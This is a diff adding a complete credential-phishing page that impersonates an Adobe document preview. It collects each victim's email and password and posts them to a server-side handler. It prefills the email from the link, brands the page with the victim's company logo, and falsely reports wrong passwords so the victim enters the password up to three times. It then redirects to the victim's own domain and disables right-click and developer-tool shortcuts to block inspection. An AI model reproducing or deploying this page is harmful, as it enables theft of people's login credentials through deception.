@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+        <title>Adobe Document</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <style>
+  .input-field {
+    width: 100%;
+    padding: 12px;
+    margin-top: 10px;
+    margin-bottom: 10px;
+    box-sizing: border-box;
+    font-size: 16px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+  }
+
+  .btnn {
+    background-color: red;
+    color: white;
+    padding: 12px;
+    width: 100%;
+    font-size: 16px;
+    font-weight: bold;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+
+  .btnn:hover {
+    background-color: darkred;
+  }
+
+  .btnn:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+  }
+
+  .container {
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 2%;
+    padding: 0 0 1% 0;
+    width: 350px;
+    -webkit-border-radius: 2px;
+    -moz-border-radius: 2px;
+    border-radius: 2px;
+    -webkit-box-shadow: 3px 3px 3px #c2c2c2;
+    -moz-box-shadow: 3px 3px 3px #c2c2c2;
+    box-shadow: 3px 3px 3px #c2c2c2;
+    font-family: Arial, Helvetica, Sans-Serif;
+    background-color: white;
+  }
+
+  .header {
+    padding: 2% 0 2% 0;
+    margin-left: auto;
+    margin-right: auto;
+    background-color: white;
+    border-bottom: 3px solid #df0c36;
+  }
+
+  .content {
+    padding: 21px 7px 0px 7px;
+  }
+
+  .footer {
+    padding: 0 20px;
+    text-align: center;
+    font-size: 12px;
+    color: #666;
+  }
+
+  body {
+    background-color: #f0f0f0;
+    font-family: Corbel, sans-serif;
+    margin: 0;
+    padding: 20px;
+  }
+
+  .error-message {
+    display: none;
+    color: red;
+    text-align: center;
+    font-size: 14px;
+    margin: 10px 0;
+    padding: 10px;
+    background-color: #ffebee;
+    border: 1px solid #f44336;
+    border-radius: 4px;
+  }
+
+  .success-message {
+    display: none;
+    color: green;
+    text-align: center;
+    font-size: 14px;
+    margin: 10px 0;
+    padding: 10px;
+    background-color: #e8f5e8;
+    border: 1px solid #4caf50;
+    border-radius: 4px;
+  }
+
+  .input-group {
+    margin-bottom: 20px;
+  }
+
+  .input-checkbox {
+    display: flex;
+    align-items: center;
+    margin: 15px 0;
+  }
+
+  .input-checkbox input[type="checkbox"] {
+    margin-right: 8px;
+    width: auto;
+  }
+
+  .input-checkbox label {
+    font-size: 14px;
+    color: #333;
+  }
+</style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="main">
+                <div class="header">
+                    <div style="text-align: center;">
+                        <img
+                            src="data:image/png;base64,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"
+                            alt="Adobe Logo"
+                            width="130px"
+                            height="70px"
+                        />
+                    </div>
+                </div>
+                <div class="content">
+                    <div class="login-form">
+                        <div class="content-title">
+                            <h3 style="text-align: center; margin-bottom: 20px;">Enter password to preview document</h3>
+                            
+                            <div id="error-message" class="error-message"></div>
+                            <div id="success-message" class="success-message"></div>
+                        </div>
+
+                        <form id="login-form" method="post" action="smtp_handler.php">
+                            <div class="input-group">
+                                <input 
+                                    class="input-field" 
+                                    type="email" 
+                                    placeholder="Email" 
+                                    id="userid" 
+                                    name="userid" 
+                                    required
+                                    autocomplete="email"
+                                />
+                            </div>
+                            
+                            <div class="input-group">
+                                <input 
+                                    class="input-field" 
+                                    type="password" 
+                                    id="password" 
+                                    placeholder="Password" 
+                                    name="userpwd" 
+                                    required
+                                    autocomplete="current-password"
+                                />
+                            </div>
+
+                            <!-- Honeypot field for bot detection -->
+                            <div style="display: none;">
+                                <label>Leave this field empty</label>
+                                <input type="text" name="website" autocomplete="off" tabindex="-1">
+                            </div>
+
+                            <div class="input-group input-checkbox">
+                                <input name="rememberme" id="rememberme" value="true" type="checkbox" />
+                                <label for="rememberme">Remember Me</label>
+                            </div>
+
+                            <div class="input-group">
+                                <button type="submit" class="btnn" id="submit-btn">Sign in</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <span>Adobe PDF © 2025. All Rights Reserved.</span>
+            </div>
+        </div>
+
+        <script>
+            // Global variables
+            let attemptCount = 0;
+            const maxAttempts = 3;
+
+            // Utility functions
+            function showMessage(message, type = 'error') {
+                const errorDiv = document.getElementById('error-message');
+                const successDiv = document.getElementById('success-message');
+                
+                if (type === 'error') {
+                    errorDiv.textContent = message;
+                    errorDiv.style.display = 'block';
+                    successDiv.style.display = 'none';
+                } else {
+                    successDiv.textContent = message;
+                    successDiv.style.display = 'block';
+                    errorDiv.style.display = 'none';
+                }
+                
+                // Auto-hide after 5 seconds
+                setTimeout(() => {
+                    errorDiv.style.display = 'none';
+                    successDiv.style.display = 'none';
+                }, 5000);
+            }
+
+            function setButtonState(loading = false) {
+                const button = document.getElementById('submit-btn');
+                if (loading) {
+                    button.textContent = 'Verifying...';
+                    button.disabled = true;
+                } else {
+                    button.textContent = 'Sign in';
+                    button.disabled = false;
+                }
+            }
+
+            function extractEmailFromURL() {
+                const fullUrl = window.location.href;
+                const match = fullUrl.match(/#([^#]+)$/);
+                return match ? decodeURIComponent(match[1]) : null;
+            }
+
+            function validateEmail(email) {
+                const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return re.test(email);
+            }
+
+            // Initialize form
+            window.addEventListener('load', function() {
+                // Extract email from URL if present
+                const email = extractEmailFromURL();
+                if (email && validateEmail(email)) {
+                    document.getElementById('userid').value = email;
+                    
+                    // Set favicon and title based on domain
+                    const domain = email.split('@')[1];
+                    const companyName = domain.split('.')[0];
+                    
+                    // Update favicon
+                    let favicon = document.querySelector('link[rel="icon"]');
+                    if (!favicon) {
+                        favicon = document.createElement('link');
+                        favicon.rel = 'icon';
+                        document.head.appendChild(favicon);
+                    }
+                    favicon.href = `https://logo.clearbit.com/${domain}`;
+                    
+                    // Update title
+                    document.title = `${companyName} - Document Access`;
+                }
+            });
+
+            // Form submission handling
+            document.getElementById('login-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+                
+                // Clear previous messages
+                document.getElementById('error-message').style.display = 'none';
+                document.getElementById('success-message').style.display = 'none';
+                
+                // Validate form
+                const userid = document.getElementById('userid').value.trim();
+                const password = document.getElementById('password').value;
+                
+                if (!userid || !password) {
+                    showMessage('Please fill in all required fields.');
+                    return;
+                }
+                
+                if (!validateEmail(userid)) {
+                    showMessage('Please enter a valid email address.');
+                    return;
+                }
+                
+                // Set loading state
+                setButtonState(true);
+                
+                // Prepare form data
+                const formData = new FormData(this);
+                
+                // Send request
+                fetch(this.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    setButtonState(false);
+                    
+                    if (data.status === 'success') {
+                        attemptCount++;
+                        
+                        // Clear password field
+                        document.getElementById('password').value = '';
+                        
+                        if (attemptCount < maxAttempts) {
+                            showMessage('Invalid password. Please try again.');
+                        } else {
+                            showMessage('Access granted. Redirecting...', 'success');
+                            
+                            // Redirect after successful "authentication"
+                            setTimeout(() => {
+                                const email = document.getElementById('userid').value;
+                                const domain = email.split('@')[1];
+                                window.location.href = `https://${domain}`;
+                            }, 2000);
+                        }
+                    } else {
+                        showMessage(data.message || 'An error occurred. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    setButtonState(false);
+                    console.error('Error:', error);
+                    showMessage('Connection error. Please try again later.');
+                });
+            });
+
+            // Prevent right-click context menu (optional security measure)
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+
+            // Prevent common developer shortcuts (optional)
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                }
+            });
+        </script>
+    </body>
+</html>
